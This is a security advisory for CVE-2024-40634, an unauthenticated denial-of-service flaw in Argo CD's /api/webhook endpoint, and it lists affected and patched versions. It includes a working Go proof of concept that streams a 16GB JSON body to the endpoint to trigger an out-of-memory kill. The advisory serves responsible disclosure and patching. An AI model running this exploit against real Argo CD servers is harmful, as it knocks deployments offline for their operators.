# Argo CD Unauthenticated Denial of Service (DoS) Vulnerability via /api/webhook Endpoint

**GHSA**: GHSA-jmvp-698c-4x3w | **CVE**: CVE-2024-40634 | **Severity**: high (CVSS 7.5)

**CWE**: CWE-400

**Affected Packages**:
- **github.com/argoproj/argo-cd** (go): >= 1.0.0, <= 1.8.7
- **github.com/argoproj/argo-cd/v2** (go): < 2.9.20
- **github.com/argoproj/argo-cd/v2** (go): >= 2.10.0, < 2.10.15
- **github.com/argoproj/argo-cd/v2** (go): >= 2.11.0, < 2.11.6

## Description

### Summary
This report details a security vulnerability in Argo CD, where an unauthenticated attacker can send a specially crafted large JSON payload to the /api/webhook endpoint, causing excessive memory allocation that leads to service disruption by triggering an Out Of Memory (OOM) kill. The issue poses a high risk to the availability of Argo CD deployments.

### Details
The webhook server always listens to requests. By default, the endpoint doesn't require authentication. It's possible to send a large, malicious request with headers (in this case "X-GitHub-Event: push") that will make ArgoCD start allocating memory to parse the incoming request. Since the request can be constructed client-side without allocating large amounts of memory, it can be arbitrarily large. Eventually, the argocd-server component will get OOMKilled as it consumes all its available memory.

The fix would be to enforce a limit on the size of the request being parsed.

### PoC
Port-forward to the argocd-server service, like so:

```console
kubectl port-forward svc/argocd-server -n argocd 8080:443
```

Run the below code:

```go
package main

import (
	"crypto/tls"
	"io"
	"net/http"
)

// Define a custom io.Reader that generates a large dummy JSON payload.
type DummyJSONReader struct {
	size int64 // Total size to generate
	read int64 // Bytes already generated
}

// Read generates the next chunk of the dummy JSON payload.
func (r *DummyJSONReader) Read(p []byte) (n int, err error) {
	if r.read >= r.size {
		return 0, io.EOF // Finished generating
	}

	start := false
	if r.read == 0 {
		// Start of JSON
		p[0] = '{'
		p[1] = '"'
		p[2] = 'd'
		p[3] = 'a'
		p[4] = 't'
		p[5] = 'a'
		p[6] = '"'
		p[7] = ':'
		p[8] = '"'
		n = 9
		start = true
	}

	for i := n; i < len(p); i++ {
		if r.read+int64(i)-int64(n)+1 == r.size-1 {
			// End of JSON
			p[i] = '"'
			p[i+1] = '}'
			r.read += int64(i) + 2 - int64(n)
			return i + 2 - n, nil
		} else {
			p[i] = 'x' // Dummy data
		}
	}

	r.read += int64(len(p)) - int64(n)
	if start {
		return len(p), nil
	}
	return len(p) - n, nil
}

func main() {
	// Initialize the custom reader with the desired size (16GB in this case).
	payloadSize := int64(16) * 1024 * 1024 * 1024 // 16GB
	reader := &DummyJSONReader{size: payloadSize}

	// HTTP client setup
	httpClient := &http.Client{
		Timeout: 0, // No timeout
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}

	req, err := http.NewRequest("POST", "https://localhost:8080/api/webhook", reader)
	if err != nil {
		panic(err)
	}

	// Set headers
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("X-GitHub-Event", "push")

	resp, err := httpClient.Do(req)
	if err != nil {
		panic(err)
	}
	defer resp.Body.Close()

	println("Response status code:", resp.StatusCode)
}
```

### Patches
A patch for this vulnerability has been released in the following Argo CD versions:

v2.11.6
v2.10.15
v2.9.20

### For more information
If you have any questions or comments about this advisory:

Open an issue in [the Argo CD issue tracker](https://github.com/argoproj/argo-cd/issues) or [discussions](https://github.com/argoproj/argo-cd/discussions)
Join us on [Slack](https://argoproj.github.io/community/join-slack) in channel #argo-cd

### Credits
This vulnerability was found & reported by Jakub Ciolek

The Argo team would like to thank these contributors for their responsible disclosure and constructive communications during the resolve of this issue

